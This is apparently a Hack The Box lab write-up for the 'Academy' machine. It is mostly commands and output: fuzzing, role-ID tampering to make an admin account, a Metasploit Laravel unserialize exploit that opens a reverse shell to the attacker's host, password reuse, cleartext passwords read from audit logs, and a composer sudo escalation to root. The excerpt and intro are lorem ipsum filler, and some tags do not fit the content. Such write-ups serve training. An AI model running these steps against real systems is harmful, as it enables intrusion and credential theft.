---
layout: single
title: Academy - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-12-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-academy/academy_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-academy/academy_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/Academy]# nmap -Pn -sCV -n 10.10.10.215                                                                             (master✱)
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-07 11:32 CET
    Nmap scan report for 10.10.10.215
    Host is up (0.043s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
    |   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
    |_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Did not follow redirect to http://academy.htb/
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    DIRB:
    -
    NIKTO:
    -

2. Visiting http://10.10.10.215 forwards you to http://academy.htb, add it to /etc/hosts.
   Create an account (test:test) and login. Looks like an education platform promotion, similar to their shop release when they
   created the box SwagShop. Looking on the page there's not much we can do. We are logged in as user egre55 and none of the links
   seem to go anywhere. Add the username to a file and start to fuzz.

   root@nidus:/git/htb/Academy# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://academy.htb/FUZZ.php -b "PHPSESSID=qotlc86o7lnh9jm51atioq3fbc"
    ________________________________________________

     :: Method           : GET
     :: URL              : http://academy.htb/FUZZ.php
     :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
     :: Header           : Cookie: PHPSESSID=qotlc86o7lnh9jm51atioq3fbc
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403
    ________________________________________________

    .htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
    .htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
    admin                   [Status: 200, Size: 2633, Words: 668, Lines: 142]
    config                  [Status: 200, Size: 0, Words: 1, Lines: 1]
    index                   [Status: 200, Size: 2117, Words: 890, Lines: 77]
    login                   [Status: 200, Size: 2627, Words: 667, Lines: 142]
    register                [Status: 200, Size: 3003, Words: 801, Lines: 149]


3. After spending some time enumerating the website, I started to investigate register.php, and in the code you can set your roleid.
    <input type="hidden" value="0" name="roleid">

    Change the roleid value from 0 (what I assume is user) to 1 (what I assume is admin), and create a new user.

    Try to login with your new admin account (test2:test2) on http://academy.htb/admin.php - SUCCESS!

4. Logged in as admin we find a to-do list:

    Item 	                                                  Status
    Complete initial set of modules (cry0l1t3 / mrb3n) 	    done
    Finalize website design 	                              done
    Test all modules 	                                      done
    Prepare launch campaign 	                              done
    Separate student and admin roles 	                      done
    Fix issue with dev-staging-01.academy.htb 	            pending

    Add dev-staging-01.academy.htb to /etc/hosts and visit the URL.

      APP_NAME "Laravel"
      --- snip ---
      APP_KEY "base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
      --- snip ---
      DB_DATABASE "homestead"
      DB_USERNAME "homestead"
      DB_PASSWORD "secret"

    Googling for Laravel vuln one of the first links that pops up is:
    "PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)"

    msf6 > use exploit/unix/http/laravel_token_unserialize_exec
    msf6 exploit(unix/http/laravel_token_unserialize_exec) > set rhosts academy.htb
    msf6 exploit(unix/http/laravel_token_unserialize_exec) > set vhost dev-staging-01.academy.htb
    msf6 exploit(unix/http/laravel_token_unserialize_exec) > set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
    msf6 exploit(unix/http/laravel_token_unserialize_exec) > set lhost 10.10.14.3
    msf6 exploit(unix/http/laravel_token_unserialize_exec) > run

    [*] Started reverse TCP handler on 10.10.14.3:4444
    [*] Command shell session 1 opened (10.10.14.3:4444 -> 10.10.10.215:51084) at 2020-12-07 12:47:57 +0100
    [*] Command shell session 2 opened (10.10.14.3:4444 -> 10.10.10.215:51086) at 2020-12-07 12:47:58 +0100

    whoami
    www-data

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    www-data@academy:/var/www/html/htb-academy-dev-01/public$

    www-data@academy:/home$ ls -al
      ls -al
      total 32
      drwxr-xr-x  8 root     root     4096 Aug 10 00:34 .
      drwxr-xr-x 20 root     root     4096 Aug  7 12:07 ..
      drwxr-xr-x  2 21y4d    21y4d    4096 Aug 10 00:34 21y4d
      drwxr-xr-x  2 ch4p     ch4p     4096 Aug 10 00:34 ch4p
      drwxr-xr-x  4 cry0l1t3 cry0l1t3 4096 Aug 12 21:58 cry0l1t3
      drwxr-xr-x  3 egre55   egre55   4096 Aug 10 23:41 egre55
      drwxr-xr-x  2 g0blin   g0blin   4096 Aug 10 00:34 g0blin
      drwxr-xr-x  5 mrb3n    mrb3n    4096 Aug 12 22:19 mrb3n


5. Enumerating the machine we find credentials in /var/www/html/academy/.env

    DB_DATABASE=academy
    DB_USERNAME=dev
    DB_PASSWORD=mySup3rP4s5w0rd!!

  Try the password with previous found usernames.

    su cry0l1t3
    Password: mySup3rP4s5w0rd!!

    $ whoami
    whoami
    cry0l1t3


    python3 -c 'import pty;pty.spawn("/bin/bash")'
    cry0l1t3@academy:/var/www/html/academy/public$
    cry0l1t3@academy:/var/www/html/academy/public$ cd ~
    cry0l1t3@academy:~$ cat user.txt
      b6254e041fcd518b6e09ed6ebb07b3d8


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Upload and run linPEAS.sh

  [+] All users & groups
  uid=0(root) gid=0(root) groups=0(root)
  uid=1000(egre55) gid=1000(egre55) groups=1000(egre55),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
  uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
  uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
  uid=1003(21y4d) gid=1003(21y4d) groups=1003(21y4d)
  uid=1004(ch4p) gid=1004(ch4p) groups=1004(ch4p)
  uid=1005(g0blin) gid=1005(g0blin) groups=1005(g0blin)

  Looking at the user and group configuration cry0l1t3 is assigned to adm, together with egre55.
  Reading about adm I find the following:
   "adm: Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole.
   Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group."

  Lucky for us, passwords from users as they use sudo / su on the CLI are stored in clear text, in the audit logs.

  Browse all audit logs and grab from TTY to find cli commands. Here we find one line containing the su command.

  cry0l1t3@academy:/var/log/audit$ cat * | grep TTY
   type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A

  Decode the hex-data using xxd
  [root:/git/htb/Academy]# echo 6D7262336E5F41634064336D79210A | xxd -r -p                                                           (master✱)
   mrb3n_Ac@d3my!

   cry0l1t3@academy:/var/log/audit$ su mrb3n
   Password: mrb3n_Ac@d3my!
   $ whoami
   mrb3n


2. Check is mrb3n can execute any sudo commandos.

$ sudo -l
[sudo] password for mrb3n:
  Matching Defaults entries for mrb3n on academy:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User mrb3n may run the following commands on academy:
      (ALL) /usr/bin/composer

Look on gtfobins for composer, and there's a privesc to root. Copy + paste and grab flag.

  $ TF=$(mktemp -d)
  $ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
  $ sudo composer --working-dir=$TF run-script x


  # whoami
   root
  # pwd
   /tmp/tmp.8MLPtosGp5
  # cat /root/root.txt
   8e76c5ed8f2684789aa970804402a032

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


Laravel RCE
  https://www.exploit-db.com/exploits/47129

System Groups - adm
  https://wiki.debian.org/SystemGroups

Logging Passwords - audit
  https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/
